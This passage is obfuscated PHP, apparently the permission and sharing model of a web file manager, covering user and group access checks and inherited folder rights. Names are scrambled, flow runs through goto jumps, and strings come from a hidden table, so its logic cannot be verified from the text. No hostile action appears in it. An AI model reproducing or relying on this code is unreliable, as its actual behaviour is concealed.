$eİøİ†»å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bŸ´İ¨’Óª = Model($eİøİ†»å[1167])->sourceListInfo($bÊç´õëÚ’, !0); $c¬Šî¢À = $eİøİ†»å[1818]; goto E¦ÅîÛâ†; d½ñ÷ÃÏò®: return $eù¤á —; goto AÏ¬ˆ¯ÂÈŠ; fç¬¨öÉê‹: $Aä¢¾“Æ¶£ = array(); foreach ($bŸ´İ¨’Óª as $Cí¯ëŠ‘íæ) { goto E ãŠÙÄ; E ãŠÙÄ: unset($Cí¯ëŠ‘íæ[$eİøİ†»å[395]]); unset($Cí¯ëŠ‘íæ[$eİøİ†»å[394]]); unset($Cí¯ëŠ‘íæ[$eİøİ†»å[392]]); goto Eº‡šĞÚ‚Ó; F¢¦Úğõ: $Cí¯ëŠ‘íæ[$eİøİ†»å[1822]] = $this->authTargetInfo($aÜø¢¿¼·); $Cí¯ëŠ‘íæ[$eİøİ†»å[483]] = rtrim($Cí¯ëŠ‘íæ[$eİøİ†»å[479]], $eİøİ†»å[8]) . $eİøİ†»å[8] . ltrim($Cí¯ëŠ‘íæ[$eİøİ†»å[483]], $eİøİ†»å[8]); $eù¤á —[] = $Cí¯ëŠ‘íæ; goto CÚ¢ã§ßİ; Eº‡šĞÚ‚Ó: unset($Cí¯ëŠ‘íæ[$eİøİ†»å[407]]); $aÜø¢¿¼· = $d›¿ä¿ğ³º[$Cí¯ëŠ‘íæ[$eİøİ†»å[385]]]; if (!$aÜø¢¿¼·) { continue; } goto F¢¦Úğõ; CÚ¢ã§ßİ: $fê‰Ö†Ùª = count(explode($eİøİ†»å[8], trim($Cí¯ëŠ‘íæ[$eİøİ†»å[483]], $eİøİ†»å[8]))); $Aä¢¾“Æ¶£[] = $fê‰Ö†Ùª + ($Cí¯ëŠ‘íæ[$eİøİ†»å[29]] == $eİøİ†»å[76] ? 0 : 1000); goto CÊ·áê„¸ä; CÊ·áê„¸ä: } array_multisort($Aä¢¾“Æ¶£, SORT_ASC, $eù¤á —); goto d½ñ÷ÃÏò®; E¦ÅîÛâ†: $eâˆ”æ™¦ä = $this->field($c¬Šî¢À)->where(array($eİøİ†»å[385] => array($eİøİ†»å[7], $bÊç´õëÚ’)))->select(); $d›¿ä¿ğ³º = array_to_keyvalue_group($eâˆ”æ™¦ä, $eİøİ†»å[385]); $eù¤á — = array(); goto fç¬¨öÉê‹; AÏ¬ˆ¯ÂÈŠ: } private function groupChidldAllRootSource($e°•š„Û) { $Bš›¨Ëéä½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¢ğî÷Ã‚Õ = Model($Bš›¨Ëéä½[1823])->groupChildrenAll($e°•š„Û); $a³Ô«·¿¿Ë = array($Bš›¨Ëéä½[478] => 0, $Bš›¨Ëéä½[473] => array($Bš›¨Ëéä½[7], $c¢ğî÷Ã‚Õ), $Bš›¨Ëéä½[387] => SourceModel::TYPE_GROUP); $dôÕŞéœ†• = Model($Bš›¨Ëéä½[759])->field($Bš›¨Ëéä½[385])->where($a³Ô«·¿¿Ë)->select(); $dôÕŞéœ†• = array_to_keyvalue($dôÕŞéœ†•, $Bš›¨Ëéä½[33], $Bš›¨Ëéä½[385]); return $dôÕŞéœ†•; } private function authTargetInfo($bÂÜÁ‹Ï²Ä) { goto a·Ë÷Äø‘ç; a·Ë÷Äø‘ç: $CæÌ‡³ó† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C²ƒœ­‰êï = array(); $A˜ˆÃ£¯ïó = array(); goto F’¸ª‹†ì‰; a‚°¢Ñ¢Å¦: return $C²ƒœ­‰êï; goto fŸëÉßò¶¹; F’¸ª‹†ì‰: $bŒ¯ªŞ’›Ø = 2 << 25; foreach ($bÂÜÁ‹Ï²Ä as $AÆ­á »½) { goto aÇ®À±ßØß; b‰¤ªï‡ì¸: $DÜäõ›¬ = 0; if ($AÆ­á »½[$CæÌ‡³ó†[387]] == SourceModel::TYPE_GROUP) { $DÜäõ›¬ = $bŒ¯ªŞ’›Ø * 2; } if ($AÆ­á »½[$CæÌ‡³ó†[387]] == SourceModel::TYPE_USER) { $DÜäõ›¬ = $bŒ¯ªŞ’›Ø; } goto dšºØàñ†’; D‘Û¿¶‹ó: if (!$BóªÉ ×À) { continue; } $BóªÉ ×À[$CæÌ‡³ó†[434]] = $d¢ÚÒÔøò²; $C²ƒœ­‰êï[] = $BóªÉ ×À; goto b‰¤ªï‡ì¸; dšºØàñ†’: if ($AÆ­á »½[$CæÌ‡³ó†[387]] == SourceModel::TYPE_USER && $AÆ­á »½[$CæÌ‡³ó†[473]] == $CæÌ‡³ó†[485]) { $DÜäõ›¬ = 0; } $A˜ˆÃ£¯ïó[] = $d¢ÚÒÔøò²[$CæÌ‡³ó†[392]] + $DÜäõ›¬; goto f¯ã¹ÃÂÏ; aÇ®À±ßØß: $d¢ÚÒÔøò² = Model($CæÌ‡³ó†[1819])->listData($AÆ­á »½[$CæÌ‡³ó†[1799]]); if (!$d¢ÚÒÔøò²) { continue; } if ($AÆ­á »½[$CæÌ‡³ó†[387]] == SourceModel::TYPE_USER) { $BóªÉ ×À = Model($CæÌ‡³ó†[491])->getInfoSimpleOuter($AÆ­á »½[$CæÌ‡³ó†[473]]); if ($BóªÉ ×À[$CæÌ‡³ó†[1490]] == $CæÌ‡³ó†[1049]) { continue; } if ($BóªÉ ×À[$CæÌ‡³ó†[1490]] == $CæÌ‡³ó†[485]) { $BóªÉ ×À[$CæÌ‡³ó†[28]] = LNG($CæÌ‡³ó†[1824]); } } else { $BóªÉ ×À = Model($CæÌ‡³ó†[475])->getInfoSimple($AÆ­á »½[$CæÌ‡³ó†[473]]); } goto D‘Û¿¶‹ó; f¯ã¹ÃÂÏ: } array_multisort($A˜ˆÃ£¯ïó, SORT_DESC, $C²ƒœ­‰êï); goto a‚°¢Ñ¢Å¦; fŸëÉßò¶¹: } public function getAllChildrenByUser($d²ŠğËÕ‡, $Eº›ñõ×¹) { goto dÙ¤İÅìàÅ; dÙ¤İÅìàÅ: $BíÓÈ¹£ã• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÁ«¢¦‘ÛÓ = Model($BíÓÈ¹£ã•[494])->getInfo($Eº›ñõ×¹); if (!$Eº›ñõ×¹ || !$d²ŠğËÕ‡ || !$AÁ«¢¦‘ÛÓ) { return array(); } goto F–½ä­Úã; Fï‚‹¸î: if ($EòáÉŒ•®š[$BíÓÈ¹£ã•[478]] == $BíÓÈ¹£ã•[485] && $EòáÉŒ•®š[$BíÓÈ¹£ã•[473]] != $F˜ßñÕˆ¨İ && $this->groupContainUser($EòáÉŒ•®š[$BíÓÈ¹£ã•[473]], $Eº›ñõ×¹)) { foreach ($AÁ«¢¦‘ÛÓ[$BíÓÈ¹£ã•[1825]] as $a÷³ƒ¹é¼•) { $c¿¯éÌŞê = Model($BíÓÈ¹£ã•[475])->getInfo($a÷³ƒ¹é¼•[$BíÓÈ¹£ã•[1650]]); $Bèçˆ•³ŸÎ = Model($BíÓÈ¹£ã•[494])->getInfoSimpleOuter($Eº›ñõ×¹); $Bèçˆ•³ŸÎ[$BíÓÈ¹£ã•[434]] = $a÷³ƒ¹é¼•[$BíÓÈ¹£ã•[392]]; if (Model($BíÓÈ¹£ã•[1819])->authCheckAction($a÷³ƒ¹é¼•[$BíÓÈ¹£ã•[392]][$BíÓÈ¹£ã•[392]], $BíÓÈ¹£ã•[1670])) { continue; } $B ¨†Ééù» = array($BíÓÈ¹£ã•[28] => $BíÓÈ¹£ã•[1442] . $c¿¯éÌŞê[$BíÓÈ¹£ã•[28]], $BíÓÈ¹£ã•[385] => $c¿¯éÌŞê[$BíÓÈ¹£ã•[407]][$BíÓÈ¹£ã•[385]], $BíÓÈ¹£ã•[75] => KodIO::make($c¿¯éÌŞê[$BíÓÈ¹£ã•[407]][$BíÓÈ¹£ã•[385]]), $BíÓÈ¹£ã•[478] => $BíÓÈ¹£ã•[485], $BíÓÈ¹£ã•[387] => $BíÓÈ¹£ã•[980], $BíÓÈ¹£ã•[29] => $BíÓÈ¹£ã•[505], $BíÓÈ¹£ã•[483] => $c¿¯éÌŞê[$BíÓÈ¹£ã•[480]], $BíÓÈ¹£ã•[1650] => $c¿¯éÌŞê[$BíÓÈ¹£ã•[1650]], $BíÓÈ¹£ã•[477] => $c¿¯éÌŞê[$BíÓÈ¹£ã•[478]], $BíÓÈ¹£ã•[1822] => array($Bèçˆ•³ŸÎ)); $CÀšÂßöŠ£[$B ¨†Ééù»[$BíÓÈ¹£ã•[385]]] = $B ¨†Ééù»; } } $cÚ¼Ãù© = array(); $a‘¤šÇ›†¶ = $this->getAllChildren($d²ŠğËÕ‡); goto d ëİÊö‚; c°¥óŒ‹­Ù: return $cÚ¼Ãù©; goto eèÂ¦¹“Üí; d ëİÊö‚: foreach ($a‘¤šÇ›†¶ as $FˆÂÌÉ‡Ò´) { $E÷àÊìæ¼ô = !1; foreach ($FˆÂÌÉ‡Ò´[$BíÓÈ¹£ã•[1822]] as $DšŒ¾Îô•) { if ($DšŒ¾Îô•[$BíÓÈ¹£ã•[1490]]) { if ($DšŒ¾Îô•[$BíÓÈ¹£ã•[1490]] == $Eº›ñõ×¹) { $E÷àÊìæ¼ô = !0; break; } } if ($DšŒ¾Îô•[$BíÓÈ¹£ã•[1650]]) { if ($this->groupContainUser($DšŒ¾Îô•[$BíÓÈ¹£ã•[1650]], $Eº›ñõ×¹)) { $E÷àÊìæ¼ô = !0; break; } } } if ($E÷àÊìæ¼ô) { $cÚ¼Ãù©[] = $FˆÂÌÉ‡Ò´; } $Dã¶ó·¯»š = $FˆÂÌÉ‡Ò´[$BíÓÈ¹£ã•[385]]; if (isset($CÀšÂßöŠ£[$Dã¶ó·¯»š])) { $FˆÂÌÉ‡Ò´[$BíÓÈ¹£ã•[1822]][] = $CÀšÂßöŠ£[$Dã¶ó·¯»š][0]; $CÀšÂßöŠ£[$Dã¶ó·¯»š] = !1; } } $CÀšÂßöŠ£ = array_filter(array_values($CÀšÂßöŠ£)); $cÚ¼Ãù© = array_merge($CÀšÂßöŠ£, $cÚ¼Ãù©); goto c°¥óŒ‹­Ù; F–½ä­Úã: $EòáÉŒ•®š = Model($BíÓÈ¹£ã•[1167])->sourceInfo($d²ŠğËÕ‡); $CÀšÂßöŠ£ = array(); $F˜ßñÕˆ¨İ = 1; goto Fï‚‹¸î; eèÂ¦¹“Üí: } public function setAllChildrenByUser($f †åÑ‰Â, $DË¾ÇñŸá©, $EåÔÒßš¶ö) { $eìŸ¨™Ã£¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‡¸ô·‡‹î = $this->getAllChildrenByUser($f †åÑ‰Â, $DË¾ÇñŸá©); if (!$EåÔÒßš¶ö || !$c‡¸ô·‡‹î) { return !1; } foreach ($c‡¸ô·‡‹î as $a³·Œ–Ï») { $DÃ©³Ò‚éè = array(); foreach ($a³·Œ–Ï»[$eìŸ¨™Ã£¶[1822]] as $fİî†·È») { $b¾¡¯òĞÎÈ = $fİî†·È»[$eìŸ¨™Ã£¶[434]]; $eƒŠˆ—Õ¸Æ = $fİî†·È»[$eìŸ¨™Ã£¶[1490]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $bßõ½–Ö = $fİî†·È»[$eìŸ¨™Ã£¶[1490]] ? $fİî†·È»[$eìŸ¨™Ã£¶[1490]] : $fİî†·È»[$eìŸ¨™Ã£¶[1650]]; if ($fİî†·È»[$eìŸ¨™Ã£¶[1490]] && $fİî†·È»[$eìŸ¨™Ã£¶[1490]] == $DË¾ÇñŸá©) { continue; } $DÃ©³Ò‚éè[] = array($eìŸ¨™Ã£¶[385] => $a³·Œ–Ï»[$eìŸ¨™Ã£¶[385]], $eìŸ¨™Ã£¶[387] => $eƒŠˆ—Õ¸Æ, $eìŸ¨™Ã£¶[473] => intval($bßõ½–Ö), $eìŸ¨™Ã£¶[1799] => isset($b¾¡¯òĞÎÈ[$eìŸ¨™Ã£¶[383]]) ? intval($b¾¡¯òĞÎÈ[$eìŸ¨™Ã£¶[383]]) : 0, $eìŸ¨™Ã£¶[1800] => isset($b¾¡¯òĞÎÈ[$eìŸ¨™Ã£¶[1800]]) ? intval($b¾¡¯òĞÎÈ[$eìŸ¨™Ã£¶[1800]]) : -1); } $DÃ©³Ò‚éè[] = array($eìŸ¨™Ã£¶[385] => $a³·Œ–Ï»[$eìŸ¨™Ã£¶[385]], $eìŸ¨™Ã£¶[387] => SourceModel::TYPE_USER, $eìŸ¨™Ã£¶[473] => intval($DË¾ÇñŸá©), $eìŸ¨™Ã£¶[1799] => intval($EåÔÒßš¶ö), $eìŸ¨™Ã£¶[1800] => -1); $this->where(array($eìŸ¨™Ã£¶[399] => $a³·Œ–Ï»[$eìŸ¨™Ã£¶[385]]))->delete(); $this->addAll($DÃ©³Ò‚éè); } return !0; } public function get($A†ò…²‹³) { $fŒ×´øÏñ¼ = $this->getSourceList(array($A†ò…²‹³), !0); return $fŒ×´øÏñ¼[0]; } public function getSourceList($aç²£–ß÷‰, $C¸÷½¦¨®å = false, $dÉ·“Æ¤È = false) { goto A„˜Ã¡åõ; DÉ†ÓÔ•ÅŠ: $Fò¡“™×™É = array_to_keyvalue_group($Fò¡“™×™É, $EÂÇĞó©[385]); $D©Í¨ëÆš = array(); foreach ($e‘ÖµŠÓÚ÷ as $f¿‘ŠàÂˆ) { if (isset($Fò¡“™×™É[$f¿‘ŠàÂˆ])) { $D©Í¨ëÆš[$f¿‘ŠàÂˆ] = $Fò¡“™×™É[$f¿‘ŠàÂˆ]; } } goto Fº‘ğí¤ôÖ; A„˜Ã¡åõ: $EÂÇĞó© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$aç²£–ß÷‰) { return array(); } $D·í îŸÀ¨ = Model($EÂÇĞó©[1167]); goto FÆøîø—­Ğ; C½›×ÑîÌ: $Dò¯ÃŸ¡øç = array(); foreach ($C¸÷½¦¨®å as $f¿‘ŠàÂˆ => $bÇ³«òõâ) { if ($AÒèŠ¿À) { $Dò¯ÃŸ¡øç[$f¿‘ŠàÂˆ] = $aÌ®ä‡óÕ; continue; } $Dò¯ÃŸ¡øç[$f¿‘ŠàÂˆ] = $this->makeSourceAuth($bÇ³«òõâ, $D©Í¨ëÆš, $dÉ·“Æ¤È); } return $Dò¯ÃŸ¡øç; goto E‚ÖÀ¯ÎÊ; b‹ò–‡å¡: foreach ($C¸÷½¦¨®å as $Aá’šÜÈ‘Ù => $aªÜÔÊÍä ) { $Cèõªùââš = $D·í îŸÀ¨->parentLevelArray($aªÜÔÊÍä [$EÂÇĞó©[476]]); $e‘ÖµŠÓÚ÷ = array_merge($e‘ÖµŠÓÚ÷, array($Aá’šÜÈ‘Ù), array_reverse($Cèõªùââš)); } $e‘ÖµŠÓÚ÷ = array_values(array_unique($e‘ÖµŠÓÚ÷)); if (!$e‘ÖµŠÓÚ÷) { return array(); } goto A‡àï‰ˆ›; FÆøîø—­Ğ: if (!$C¸÷½¦¨®å && count($aç²£–ß÷‰) == 1) { $C¸÷½¦¨®å = array(); $C¸÷½¦¨®å[$aç²£–ß÷‰[0]] = $D·í îŸÀ¨->sourceInfo($aç²£–ß÷‰[0]); } if (!$C¸÷½¦¨®å) { $a–à“ß ¨© = array($EÂÇĞó©[399] => array($EÂÇĞó©[400], $aç²£–ß÷‰)); $C¸÷½¦¨®å = $D·í îŸÀ¨->field($EÂÇĞó©[1826])->where($a–à“ß ¨©)->select(); $C¸÷½¦¨®å = array_to_keyvalue($C¸÷½¦¨®å, $EÂÇĞó©[385]); } $e‘ÖµŠÓÚ÷ = $aç²£–ß÷‰; goto b‹ò–‡å¡; Fº‘ğí¤ôÖ: $AÒèŠ¿À = $this->userIsRoot($dÉ·“Æ¤È); $A¡öÓÌóºÆ = AuthModel::authAll(); $aÌ®ä‡óÕ = array($EÂÇĞó©[393] => $A¡öÓÌóºÆ, $EÂÇĞó©[1828] => array($EÂÇĞó©[401] => 0, $EÂÇĞó©[1656] => $A¡öÓÌóºÆ, $EÂÇĞó©[402] => LNG($EÂÇĞó©[1829]), $EÂÇĞó©[1671] => $EÂÇĞó©[1830])); goto C½›×ÑîÌ; A‡àï‰ˆ›: $dÙâ¿ª˜¼ = $EÂÇĞó©[1827]; $a–à“ß ¨© = array($EÂÇĞó©[399] => array($EÂÇĞó©[400], $e‘ÖµŠÓÚ÷)); $Fò¡“™×™É = $this->field($dÙâ¿ª˜¼)->where($a–à“ß ¨©)->select(); goto DÉ†ÓÔ•ÅŠ; E‚ÖÀ¯ÎÊ: } public function authDeepCheck($EÖ…™ğì‹À, $f·¿ø¿°ò‹ = false) { goto bÇßé–ÏğÕ; Dğø‹’ø‰: $c—­„¦Î½ë = $fÑÒæÊ—¶ ? $fÑÒæÊ—¶[0] : $EÖ…™ğì‹À; return array($C‹ÔÕ®‘”ñ[393] => -1, $C‹ÔÕ®‘”ñ[434] => array($C‹ÔÕ®‘”ñ[401] => $C‹ÔÕ®‘”ñ[1049], $C‹ÔÕ®‘”ñ[1656] => $C‹ÔÕ®‘”ñ[485], $C‹ÔÕ®‘”ñ[402] => LNG($C‹ÔÕ®‘”ñ[1833]), $C‹ÔÕ®‘”ñ[1671] => $C‹ÔÕ®‘”ñ[1834]), $C‹ÔÕ®‘”ñ[1835] => LNG($C‹ÔÕ®‘”ñ[1836]), $C‹ÔÕ®‘”ñ[1837] => $this->sourceAuthInfo($c—­„¦Î½ë)); goto AÄŒøªïá; bÇßé–ÏğÕ: $C‹ÔÕ®‘”ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f·¿ø¿°ò‹ = $f·¿ø¿°ò‹ ? $f·¿ø¿°ò‹ : USER_ID; $c¸˜…‹Òºİ = $this->makeAuthDeep($f·¿ø¿°ò‹); goto BŒ¦¥ƒÄÌŸ; BŒ¦¥ƒÄÌŸ: if (!in_array($EÖ…™ğì‹À, $c¸˜…‹Òºİ[$C‹ÔÕ®‘”ñ[1831]])) { return !1; } $fÑÒæÊ—¶ = array(); foreach ($c¸˜…‹Òºİ[$C‹ÔÕ®‘”ñ[1832]] as $F…ì‰”²¡â => $aÔÍô‡Ïİ) { if (!in_array($EÖ…™ğì‹À, $aÔÍô‡Ïİ)) { continue; } $fÑÒæÊ—¶[] = $F…ì‰”²¡â; } goto Dğø‹’ø‰; AÄŒøªïá: } protected function makeAuthDeep($DÂËáÑ×Œô = false) { goto e»½‰—ñ±; a×’Çá±»É: $b‚ææ¢î©ó = array(); $Eé‹œìëŒƒ = array(); $cÕñ±Òñ× = array(); goto b­ô–Ê¸à; dùªŒ¤²İÛ: if (isset($cê«îùå¤[$DÂËáÑ×Œô])) { return $cê«îùå¤[$DÂËáÑ×Œô]; } $fÃˆ‚òø­‡ = Model($EÄ»ê”¸á¾[1838])->listData(); $BŸÊÙÇñá = array(); goto b§’•ˆØéº; e—·¸‹‰Úœ: if ($D’Äë–®“š) { $CÖ×—…é’ = array(array($EÄ»ê”¸á¾[387] => SourceModel::TYPE_USER, $EÄ»ê”¸á¾[473] => $DÂËáÑ×Œô), array($EÄ»ê”¸á¾[387] => SourceModel::TYPE_GROUP, $EÄ»ê”¸á¾[473] => array($EÄ»ê”¸á¾[400], $D’Äë–®“š)), $EÄ»ê”¸á¾[922] => $EÄ»ê”¸á¾[1739]); } $Cë²²Œ¾ƒğ = $this->field($EÄ»ê”¸á¾[1839])->where($CÖ×—…é’)->select(); $Aõ¯×•»Çâ = array(); goto Dö®¨ÎÁ´; eì‚“¤­»Á: $bÍõÛè‚¾ = $D’Äë–®“š; $bšÔó†‰ŠÂ = Model($EÄ»ê”¸á¾[1167]); $bÂ¡©çø¼£ = Model($EÄ»ê”¸á¾[475]); goto a×’Çá±»É; A…ÊèŠÁÍø: $FÄ…‘ïÎÉ¨ = $bÍõÛè‚¾; foreach ($FÄ…‘ïÎÉ¨ as $F’÷¹ƒİÍå) { $fÕ¼¡‡¸å‚ = $bÂ¡©çø¼£->getInfo($F’÷¹ƒİÍå); $Bâ½¸Âõ® = $bšÔó†‰ŠÂ->parentLevelArray($fÕ¼¡‡¸å‚[$EÄ»ê”¸á¾[476]]); $bÍõÛè‚¾ = array_merge($bÍõÛè‚¾, $Bâ½¸Âõ®); } $bÍõÛè‚¾ = array_values(array_unique($bÍõÛè‚¾)); goto A¶Õñó‡Ó; e»½‰—ñ±: $EÄ»ê”¸á¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $cê«îùå¤ = array(); $DÂËáÑ×Œô = $DÂËáÑ×Œô ? $DÂËáÑ×Œô : USER_ID; goto dùªŒ¤²İÛ; b§’•ˆØéº: foreach ($fÃˆ‚òø­‡ as $c½Êëµ°¥·) { if ($c½Êëµ°¥·[$EÄ»ê”¸á¾[392]] == 0 && $c½Êëµ°¥·[$EÄ»ê”¸á¾[1672]] == $EÄ»ê”¸á¾[83]) { $BŸÊÙÇñá[] = $c½Êëµ°¥·[$EÄ»ê”¸á¾[383]]; } } $D’Äë–®“š = $this->userGroupParents($DÂËáÑ×Œô); $CÖ×—…é’ = array($EÄ»ê”¸á¾[387] => SourceModel::TYPE_USER, $EÄ»ê”¸á¾[473] => $DÂËáÑ×Œô); goto e—·¸‹‰Úœ; A¶Õñó‡Ó: foreach ($bÍõÛè‚¾ as $F’÷¹ƒİÍå) { $fÕ¼¡‡¸å‚ = $bÂ¡©çø¼£->getInfo($F’÷¹ƒİÍå); $f˜ëé›“ôò[] = $fÕ¼¡‡¸å‚[$EÄ»ê”¸á¾[407]][$EÄ»ê”¸á¾[385]]; $cÕñ±Òñ×[$F’÷¹ƒİÍå] = $fÕ¼¡‡¸å‚[$EÄ»ê”¸á¾[407]][$EÄ»ê”¸á¾[385]]; $aêöºà×[$F’÷¹ƒİÍå] = $bšÔó†‰ŠÂ->parentLevelArray($fÕ¼¡‡¸å‚[$EÄ»ê”¸á¾[476]]); } foreach ($b‚ææ¢î©ó as $DĞæ»£ÖÑ¶ => $E¬Ï£ì¬˜ğ) { $Eê¹·‰‚ƒš = $Eé‹œìëŒƒ[$DĞæ»£ÖÑ¶]; if (!$Eê¹·‰‚ƒš || !$cÕñ±Òñ×[$Eê¹·‰‚ƒš]) { continue; } $Cï´˜·À¶½ = array(); foreach ($aêöºà×[$Eê¹·‰‚ƒš] as $F’÷¹ƒİÍå) { $Cï´˜·À¶½[] = $cÕñ±Òñ×[$F’÷¹ƒİÍå]; } $b‚ææ¢î©ó[$DĞæ»£ÖÑ¶] = array_merge($Cï´˜·À¶½, $E¬Ï£ì¬˜ğ); } $f˜ëé›“ôò = array_values(array_unique($f˜ëé›“ôò)); goto DçŞ†Œ–; b­ô–Ê¸à: $aêöºà× = array(); if ($Aõ¯×•»Çâ) { $e«ÛãÎ’Ñ‡ = $bšÔó†‰ŠÂ->where(array($EÄ»ê”¸á¾[385] => array($EÄ»ê”¸á¾[400], $Aõ¯×•»Çâ)))->select(); foreach ($e«ÛãÎ’Ñ‡ as $F²Ø»´Æ’²) { $Bâ½¸Âõ® = $bšÔó†‰ŠÂ->parentLevelArray($F²Ø»´Æ’²[$EÄ»ê”¸á¾[476]]); $f˜ëé›“ôò = array_merge($f˜ëé›“ôò, $Bâ½¸Âõ®); $bÍõÛè‚¾[] = $F²Ø»´Æ’²[$EÄ»ê”¸á¾[473]]; $b‚ææ¢î©ó[$F²Ø»´Æ’²[$EÄ»ê”¸á¾[385]]] = $Bâ½¸Âõ®; $Eé‹œìëŒƒ[$F²Ø»´Æ’²[$EÄ»ê”¸á¾[385]]] = $F²Ø»´Æ’²[$EÄ»ê”¸á¾[473]]; } } $bÍõÛè‚¾ = array_values(array_unique($bÍõÛè‚¾)); goto A…ÊèŠÁÍø; DçŞ†Œ–: $A¨¤±¤İÍ± = array($EÄ»ê”¸á¾[1831] => $f˜ëé›“ôò, $EÄ»ê”¸á¾[1832] => $b‚ææ¢î©ó); $cê«îùå¤[$DÂËáÑ×Œô] = $A¨¤±¤İÍ±; return $A¨¤±¤İÍ±; goto b„À¾ÑÌ¹õ; Dö®¨ÎÁ´: $fï‹ ÃŞ‚Å = array_to_keyvalue_group($Cë²²Œ¾ƒğ, $EÄ»ê”¸á¾[385]); foreach ($fï‹ ÃŞ‚Å as $A¢”êß¤× => $CµŠˆ”Ôì) { $C‰“ª‰Š»® = $this->authArrayCheck($CµŠˆ”Ôì, $DÂËáÑ×Œô); if ($C‰“ª‰Š»®[$EÄ»ê”¸á¾[393]] > 0) { $Aõ¯×•»Çâ[] = $A¢”êß¤× . $EÄ»ê”¸á¾[33]; } } $f˜ëé›“ôò = array(); goto eì‚“¤­»Á; b„À¾ÑÌ¹õ: } private function makeSourceAuth($C¸£¾§©†‚, $B„ª”ãï¾Ñ, $AåÃÍ®Õºš = false) { goto d“’Ôœ É¼; AÖöÔ„æ£: $AÑ‚ó¶¢ = Model($a‚˜–öº…ì[1167])->parentLevelArray($C¸£¾§©†‚[$a‚˜–öº…ì[476]]); $AÑ‚ó¶¢ = array_merge(array($C¸£¾§©†‚[$a‚˜–öº…ì[385]]), array_reverse($AÑ‚ó¶¢)); $C´Ï¼µó° = !1; goto fŠŒ›§©É; fŠŒ›§©É: foreach ($AÑ‚ó¶¢ as $eËø¯»ãÔğ) { if (!isset($B„ª”ãï¾Ñ[$eËø¯»ãÔğ])) { continue; } $A½óÊ¯±¨ = $this->authMake($B„ª”ãï¾Ñ[$eËø¯»ãÔğ], $AåÃÍ®Õºš); if ($A½óÊ¯±¨[$a‚˜–öº…ì[434]]) { $C´Ï¼µó° = $A½óÊ¯±¨; break; } } if (!$cº¤‹™³ö) { return $C´Ï¼µó°; } if (!$C´Ï¼µó° && $c³õá¸¼¡) { $C´Ï¼µó° = $this->groupAuthInfo($c³õá¸¼¡, $EãÈ²¿°ç); } goto A‰ÖóÓ…‰Ê; A‰ÖóÓ…‰Ê: if (!$C´Ï¼µó°) { $dŒ‚©ƒñ¬ = Model($a‚˜–öº…ì[475])->getInfo($EãÈ²¿°ç); $BÀÃµ¶Î™ô = explode($a‚˜–öº…ì[47], trim($dŒ‚©ƒñ¬[$a‚˜–öº…ì[476]], $a‚˜–öº…ì[47])); foreach ($BÀÃµ¶Î™ô as $døòê«¯ó) { if ($døòê«¯ó == $a‚˜–öº…ì[485] || $døòê«¯ó == $D´Óæ¨‚ó†) { continue; } $FˆõÍ—ßŞ¬ = $this->groupRootAuth($døòê«¯ó, $AåÃÍ®Õºš); if (!$FˆõÍ—ßŞ¬) { continue; } $C´Ï¼µó° = $this->groupAuthInfo($FˆõÍ—ßŞ¬, $døòê«¯ó); break; } } if (!$C´Ï¼µó° || $C´Ï¼µó°[$a‚˜–öº…ì[393]] <= 0) { $aæ¤¢±Ÿ = $this->authDeepCheck($C¸£¾§©†‚[$a‚˜–öº…ì[385]], $AåÃÍ®Õºš); if ($aæ¤¢±Ÿ) { $C´Ï¼µó° = $aæ¤¢±Ÿ; } } return $C´Ï¼µó°; goto D³êßŒ¦ò; d“’Ôœ É¼: $a‚˜–öº…ì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D´Óæ¨‚ó† = $a‚˜–öº…ì[83]; $EãÈ²¿°ç = $C¸£¾§©†‚[$a‚˜–öº…ì[473]]; goto BõÌÇ’‚Ïƒ; BõÌÇ’‚Ïƒ: $cº¤‹™³ö = $C¸£¾§©†‚[$a‚˜–öº…ì[387]] == SourceModel::TYPE_GROUP; $c³õá¸¼¡ = $cº¤‹™³ö ? $this->groupRootAuth($EãÈ²¿°ç, $AåÃÍ®Õºš) : !1; if ($c³õá¸¼¡ && Model($a‚˜–öº…ì[1819])->authCheckAction($c³õá¸¼¡[$a‚˜–öº…ì[392]], $a‚˜–öº…ì[1670])) { return $this->groupAuthInfo($c³õá¸¼¡, $EãÈ²¿°ç); } goto AÖöÔ„æ£; D³êßŒ¦ò: } private function userIsRoot($Eå…ÚÁ‘Ù¨ = false) { $A‹ÂëÓ“ª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Eå…ÚÁ‘Ù¨ && _get($GLOBALS, $A‹ÂëÓ“ª[474])) { return !0; } $fÃÄò›Ò‘ = Model($A‹ÂëÓ“ª[494])->getInfo($Eå…ÚÁ‘Ù¨); $E³´ƒ¦‚£» = Model($A‹ÂëÓ“ª[1840])->listData($fÃÄò›Ò‘[$A‹ÂëÓ“ª[1374]]); if ($E³´ƒ¦‚£» && $E³´ƒ¦‚£»[$A‹ÂëÓ“ª[1243]][$A‹ÂëÓ“ª[1841]] == 1) { return !0; } return !1; } private function sourceAuthInfo($EïáºÚñ™) { goto B¹ò©…Á¡š; CÑ˜÷µ„ÕÁ: $e´‹½°¯“ = $DíÅÎØ·«ª->_listAppendPath($e´‹½°¯“); $b¶¬Ñ´£Ã = $e´‹½°¯“[0]; $a‡’ÚÏ° = $b¶¬Ñ´£Ã[$eóÒÖÀ«[483]]; goto Aµ‘±˜—‚; Aµ‘±˜—‚: if (isset($b¶¬Ñ´£Ã[$eóÒÖÀ«[481]])) { $AÀÓ‹ÆÓ¶ = explode($eóÒÖÀ«[8], trim($b¶¬Ñ´£Ã[$eóÒÖÀ«[483]], $eóÒÖÀ«[8])); array_shift($AÀÓ‹ÆÓ¶); $a‡’ÚÏ° = $b¶¬Ñ´£Ã[$eóÒÖÀ«[479]] . $eóÒÖÀ«[1842] . implode($eóÒÖÀ«[8], $AÀÓ‹ÆÓ¶); } return array($eóÒÖÀ«[402] => $b¶¬Ñ´£Ã[$eóÒÖÀ«[28]], $eóÒÖÀ«[75] => KodIO::make($b¶¬Ñ´£Ã[$eóÒÖÀ«[385]]), $eóÒÖÀ«[1843] => $a‡’ÚÏ°); goto eØƒ±¿»İ; B¹ò©…Á¡š: $eóÒÖÀ« =& 